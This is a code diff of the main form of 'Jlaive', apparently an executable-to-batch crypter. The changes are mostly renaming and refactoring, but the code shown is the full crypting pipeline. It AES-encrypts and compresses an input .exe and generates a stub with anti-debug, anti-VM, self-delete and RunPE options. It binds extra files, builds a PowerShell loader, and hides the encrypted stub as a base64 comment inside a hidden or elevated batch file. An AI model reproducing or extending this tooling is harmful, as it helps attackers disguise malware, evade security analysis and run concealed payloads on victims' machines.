@@ -18,7 +18,6 @@ namespace Jlaive
             InitializeComponent();
         }
 
-        // Event handlers
         private void Form1_Load(object sender, EventArgs e)
         {
             SettingsObject obj = Settings.Load();
@@ -37,10 +36,24 @@ namespace Jlaive
             OpenFileDialog ofd = new OpenFileDialog();
             ofd.RestoreDirectory = true;
             if (ofd.ShowDialog() != DialogResult.OK) return;
-            textBox1.Text = ofd.FileName;
+            input.Text = ofd.FileName;
         }
 
-        private void buildButton_Click(object sender, EventArgs e) => Crypt();
+        private void buildButton_Click(object sender, EventArgs e)
+        {
+            if (!File.Exists(input.Text))
+            {
+                MessageBox.Show("Invalid input path.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                return;
+            }
+            if (Path.GetExtension(input.Text) != ".exe")
+            {
+                MessageBox.Show("Invalid input file.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                return;
+            }
+            Crypt(input.Text, Convert.FromBase64String(key.Text), Convert.FromBase64String(iv.Text));
+        }
+
         private void refreshKeys_Click(object sender, EventArgs e) => UpdateKeys();
 
         private void addFile_Click(object sender, EventArgs e)
@@ -48,57 +61,39 @@ namespace Jlaive
             OpenFileDialog ofd = new OpenFileDialog();
             ofd.RestoreDirectory = true;
             if (ofd.ShowDialog() != DialogResult.OK) return;
-            listBox1.Items.Add(ofd.FileName);
+            bindedFiles.Items.Add(ofd.FileName);
         }
 
         private void removeFile_Click(object sender, EventArgs e)
         {
-            listBox1.Items.Remove(listBox1.SelectedItem);
+            bindedFiles.Items.Remove(bindedFiles.SelectedItem);
         }
 
-        // Functions
-        private void Crypt()
+        private void Crypt(string _input, byte[] _key, byte[] _iv)
         {
             buildButton.Enabled = false;
             tabControl1.SelectedTab = tabControl1.TabPages["outputPage"];
-            listBox2.Items.Clear();
+            log.Items.Clear();
 
             Random rng = new Random();
-            string _input = textBox1.Text;
-            byte[] _key = Convert.FromBase64String(key.Text);
-            byte[] _iv = Convert.FromBase64String(iv.Text);
             StubGen stubgen = new StubGen(_key, _iv, rng);
 
-            if (!File.Exists(_input))
-            {
-                MessageBox.Show("Invalid input path.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
-                buildButton.Enabled = true;
-                return;
-            }
-            if (Path.GetExtension(_input) != ".exe")
-            {
-                MessageBox.Show("Invalid input file.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
-                buildButton.Enabled = true;
-                return;
-            }
-
-            Console.ForegroundColor = ConsoleColor.Gray;
             byte[] pbytes = File.ReadAllBytes(_input);
             bool isnetasm = IsAssembly(_input);
 
             if (isnetasm)
             {
-                listBox2.Items.Add("Patching assembly...");
+                log.Items.Add("Patching assembly...");
                 pbytes = Patcher.Fix(pbytes);
             }
 
-            listBox2.Items.Add("Encrypting payload...");
+            log.Items.Add("Encrypting payload...");
             byte[] payload_enc = Encrypt(Compress(pbytes), _key, _iv);
 
-            listBox2.Items.Add("Creating stub...");
+            log.Items.Add("Creating stub...");
             string stub = stubgen.CreateCS(antiDebug.Checked, antiVM.Checked, meltFile.Checked, !isnetasm);
 
-            listBox2.Items.Add("Building stub...");
+            log.Items.Add("Building stub...");
             File.WriteAllBytes("payload.exe", payload_enc);
             if (!isnetasm)
             {
@@ -108,7 +103,7 @@ namespace Jlaive
             List<string> embeddedresources = new List<string>();
             embeddedresources.Add("payload.exe");
             if (!isnetasm) embeddedresources.Add("runpe.dll");
-            embeddedresources.AddRange(listBox1.Items.Cast<string>());
+            embeddedresources.AddRange(bindedFiles.Items.Cast<string>());
             Compiler compiler = new Compiler
             {
                 References = new string[] { "mscorlib.dll", "System.Core.dll", "System.dll", "System.Management.dll" },
@@ -119,22 +114,21 @@ namespace Jlaive
             {
                 File.Delete("payload.exe");
                 if (!isnetasm) File.Delete("runpe.dll");
-                List<string> errors = new List<string>();
-                foreach (CompilerError error in result.CompilerResults.Errors) errors.Add(error.ErrorText);
-                MessageBox.Show($"Stub build errors:{Environment.NewLine}{string.Join(Environment.NewLine, errors)}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                string errors = string.Join(Environment.NewLine, result.CompilerResults.Errors.Cast<CompilerError>().Select(error => error.ErrorText));
+                MessageBox.Show($"Stub build errors:{Environment.NewLine}{errors}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                 buildButton.Enabled = true;
                 return;
             }
             File.Delete("payload.exe");
             if (!isnetasm) File.Delete("runpe.dll");
 
-            listBox2.Items.Add("Encrypting stub...");
+            log.Items.Add("Encrypting stub...");
             byte[] stub_enc = Encrypt(Compress(result.AssemblyBytes), _key, _iv);
 
-            listBox2.Items.Add("Creating PowerShell command...");
+            log.Items.Add("Creating PowerShell command...");
             string pscommand = stubgen.CreatePS();
 
-            listBox2.Items.Add("Creating batch file...");
+            log.Items.Add("Creating batch file...");
             string content = stubgen.CreateBat(pscommand, hidden.Checked, runas.Checked);
             List<string> content_lines = new List<string>(content.Split(new string[] { Environment.NewLine }, StringSplitOptions.None));
             content_lines.Insert(rng.Next(0, content_lines.Count), ":: " + Convert.ToBase64String(stub_enc));
@@ -151,11 +145,11 @@ namespace Jlaive
             };
             sfd.ShowDialog();
 
-            listBox2.Items.Add("Writing output...");
+            log.Items.Add("Writing output...");
             File.WriteAllText(sfd.FileName, content, Encoding.ASCII);
 
             MessageBox.Show("Done!", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
-            refreshKeys.PerformClick();
+            UpdateKeys();
             buildButton.Enabled = true;
         }
 
@@ -167,22 +161,11 @@ namespace Jlaive
             aes.Dispose();
         }
 
-        private void UnpackSettings(SettingsObject obj)
-        {
-            textBox1.Text = obj.inputFile;
-            antiDebug.Checked = obj.antiDebug;
-            antiVM.Checked = obj.antiVM;
-            meltFile.Checked = obj.selfDelete;
-            hidden.Checked = obj.hidden;
-            runas.Checked = obj.runas;
-            listBox1.Items.AddRange(obj.bindedFiles);
-        }
-
         private SettingsObject PackSettings()
         {
             SettingsObject obj = new SettingsObject()
             {
-                inputFile = textBox1.Text,
+                inputFile = input.Text,
                 antiDebug = antiDebug.Checked,
                 antiVM = antiVM.Checked,
                 selfDelete = meltFile.Checked,
@@ -190,9 +173,20 @@ namespace Jlaive
                 runas = runas.Checked
             };
             List<string> paths = new List<string>();
-            foreach (string item in listBox1.Items) paths.Add(item);
+            foreach (string item in bindedFiles.Items) paths.Add(item);
             obj.bindedFiles = paths.ToArray();
             return obj;
+        }
+
+        private void UnpackSettings(SettingsObject obj)
+        {
+            input.Text = obj.inputFile;
+            antiDebug.Checked = obj.antiDebug;
+            antiVM.Checked = obj.antiVM;
+            meltFile.Checked = obj.selfDelete;
+            hidden.Checked = obj.hidden;
+            runas.Checked = obj.runas;
+            bindedFiles.Items.AddRange(obj.bindedFiles);
         }
     }
 }
